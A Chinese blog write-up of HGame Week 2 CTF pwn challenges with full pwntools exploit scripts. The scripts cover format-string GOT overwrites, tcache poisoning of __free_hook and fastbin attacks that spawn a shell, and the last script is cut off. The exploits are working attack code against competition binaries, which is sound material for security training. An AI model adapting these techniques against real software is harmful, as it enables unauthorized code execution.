[{"categories":["writeup","HGame"],"contents":" I\u0026rsquo;d rather attempt to do something great and fail than to attempt to do nothing and succeed. — Robert Schuller\n[上期见这里](../HGame Week1 PWN WriteUp)\nYukkuriSay checksec查看程序架构 发现了canary，但是这题溢出不到canary，那么可能可以利用canary其他的漏洞，比如更改__stack_check_fail的got值\nida查看伪C代码 函数主体是一个不断向一个没有溢出漏洞的栈空间写入内容（这个内容被用%s打印出来，没有格式化字符串漏洞），然后是一个非栈上格式化字符串漏洞\n法一：利用栈上保存的setbuffer函数地址泄露libc后更改__stack_check_fail的got值 我们可以利用%s的特点把这个setbuffer+204打印出来，然后就泄露得到了栈地址\n然后我们再用同样的方法得到栈地址\n因为我们第一次写入的内容保存在栈上，所以最后我们可以利用格式化字符串漏洞实现任意地址写，更改__stack_check_fail的got值为one_gadget后，再更改canary触发__stack_check_fail\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./HGame-week2-YukkuriSay\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31110\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)].ljust(8, b\u0026#34;\\x00\u0026#34;)) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... p = None def pwn(): global p if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x4016A4 c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 11111111 # %8$s payload = flat([ b\u0026#34;a\u0026#34;*(0xe0), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) base_addr = recv_and_transform(b\u0026#34;b\u0026#34;*8) - libc.sym[\u0026#39;setbuffer\u0026#39;] - 204 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[1] suclog( base_addr=base_addr, one_gadget=one_gadget, system_addr=system_addr ) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ b\u0026#34;a\u0026#34;*(0xf8), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) stack_addr = recv_and_transform(b\u0026#34;b\u0026#34;*6) - 0x18 suclog(stack_addr=stack_addr) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;], m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;] + 2, m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;] + 4, stack_addr ]) sendline_after_clean(payload) sendline_after_clean(\u0026#34;n\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) write1 = one_gadget \u0026amp; 0xffff write2 = ((one_gadget \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff) write3 = ((one_gadget \u0026gt;\u0026gt; (4*8)) \u0026amp; 0xffff) which_write = {write1:8, write2:9, write3:10} all_write = [write1, write2, write3] all_write.sort() payload = \u0026#34;\u0026#34; tmp = 0 for to_write in all_write: payload += f\u0026#34;%{to_write-tmp}c%{which_write[to_write]}$hn\u0026#34; tmp = to_write payload += f\u0026#34;%11$hhn\u0026#34; # %43$n # payload = f\u0026#34;%{write2}c%8$hn%{write1-write2}c%9$hn%{write3-write1}c%10$hn\u0026#34; sendline_after_clean(payload, \u0026#34;a gift for you: \\n\u0026#34;) pwn() interactive_after_clean() 法二：获取栈地址后更改返回地址和printf的got值 我们既然可以更改任意地址的值，同时获得了栈地址，那么我们可以先更改printf的got值为system，再更改返回值，然后返回到主函数某一个位置，printf出/bin/sh，就可以getshell了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-YukkuriSay\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31110\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)].ljust(8, b\u0026#34;\\x00\u0026#34;)) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... p = None def pwn(): global p if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x4016A4 c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 11111111 # %8$s payload = flat([ b\u0026#34;a\u0026#34;*(0xe0), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) base_addr = recv_and_transform(b\u0026#34;b\u0026#34;*8) - libc.sym[\u0026#39;setbuffer\u0026#39;] - 204 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[1] suclog( base_addr=base_addr, one_gadget=one_gadget, system_addr=system_addr ) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ b\u0026#34;a\u0026#34;*(0xf8), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) stack_addr = recv_and_transform(b\u0026#34;b\u0026#34;*6) - 0x8 suclog(stack_addr=stack_addr) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ m_elf.got[\u0026#39;printf\u0026#39;], m_elf.got[\u0026#39;printf\u0026#39;] + 2, m_elf.got[\u0026#39;printf\u0026#39;] + 4, stack_addr, stack_addr + 2 ]) sendline_after_clean(payload) sendline_after_clean(\u0026#34;n\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) return_addr = 0x401671 write1 = system_addr \u0026amp; 0xffff write2 = ((system_addr \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff) write3 = ((system_addr \u0026gt;\u0026gt; (4*8)) \u0026amp; 0xffff) ret1 = return_addr \u0026amp; 0xffff ret2 = (return_addr \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff which_write = {write1:8, write2:9, write3:10, ret1: 11, ret2:12} all_write = [write1, write2, write3, ret1, ret2] all_write.sort() payload = \u0026#34;\u0026#34; tmp = 0 for to_write in all_write: payload += f\u0026#34;%{to_write-tmp}c%{which_write[to_write]}$hn\u0026#34; tmp = to_write # %43$n # payload = f\u0026#34;%{write2}c%8$hn%{write1-write2}c%9$hn%{write3-write1}c%10$hn\u0026#34; sendline_after_clean(payload, \u0026#34;a gift for you: \\n\u0026#34;) sendline_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34;) pwn() interactive_after_clean() editable_note checksec查看程序架构 ida查看伪C代码 这道题不走寻常路，使用内联汇编实现了一个堆菜单题，最终还是通过数字选择这三个功能：\n大致思路就是先填满tcache bin（7个）后分配到unsorted bin中泄露main_arena，然后将tcache分配到__free_hook上覆盖更改为system\n小贴士 在更改tcache中chunk的next位时，一定要确保分配完__free_hook上的chunk后，tcache-\u0026gt;counts要大于1\n比如：\n像这种情况，0x20的tcache bin就不会再申请__free_hook的chunk了，而是转而去分割unsorted bin中的chunk\n原因是每一个不同大小的tcache，它都独立维护一个counts域，而在malloc的时候会检查这个域，只有当它大于等于0的时候才会执行tcache_get：\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-editable_note\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30248\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) sendline_after_clean(str(size)) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;4\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) sendline_after_clean(content, \u0026#34;Content: \u0026#34;) main_arena_offset = 0x1ECB80 allocate(0, 0x10) allocate(1, 0x80) allocate(2, 0x80) allocate(3, 0x80) allocate(4, 0x80) allocate(5, 0x80) allocate(6, 0x80) allocate(7, 0x80) allocate(8, 0x80) allocate(9, 0x10) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) remove(8) # gdb.attach(p) remove(1) show(1) # gdb.attach(p) base_addr = recv_and_transform() - main_arena_offset - 96 one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[2] hook_addr = base_addr + libc.sym[\u0026#39;__free_hook\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;one_gadget\u0026#34;, \u0026#34;hook_addr\u0026#34;, \u0026#34;system_addr\u0026#34; ) # remove(8) payload = pg(hook_addr)*2 change(8, payload) # gdb.attach(p) allocate(10, 0x80) allocate(11, 0x80) # gdb.attach(p) payload = flat([ system_addr ]) change(11, payload) change(10, b\u0026#34;/bin/sh\\x00\u0026#34;) remove(10) interactive_after_clean() fast_note checksec查看程序架构 ida查看伪C代码 这道题没有edit函数，同时free后指针没有置零，而且还是一道glibc2.23的题目\n那么思路就很清楚了：unsorted bin泄露main_arena后进行fastbin attack\n小贴士 这一题向__malloc_hook写入one_gadget并不能get shell，因为几个限制条件都没有满足，我们可以向__malloc_hook写入__libc_realloc+offset，然后在__realloc_hook上写入one_gadget\n因为realloc函数中有很多push指令，会改变当前栈的分布，我们可以控制offset来控制栈的更改程度。\n根据realloc的代码，我们可以知道offset的可能值为0，2，4，6，12，13，而通常的one_gadget有3~4个（但有一些的限制条件不是栈），所以可能的搭配大约有18~24种，一般来说，一个一个试会快一点，除非调试很简单\n更多详见：\n利用realloc调整栈使one_gadget生效_Loτυs的博客-CSDN博客_one_gadget onegadget不起作用_Maxmalloc的博客-CSDN博客_\u0026ldquo;doesn\u0026rsquo;t contain string \u0026quot;/bin/sh\u0026quot;, not glibc?\u0026rdquo; exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./HGame-week2-fast_note\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;31938\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; set resolve-heap-via-heuristic on break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = 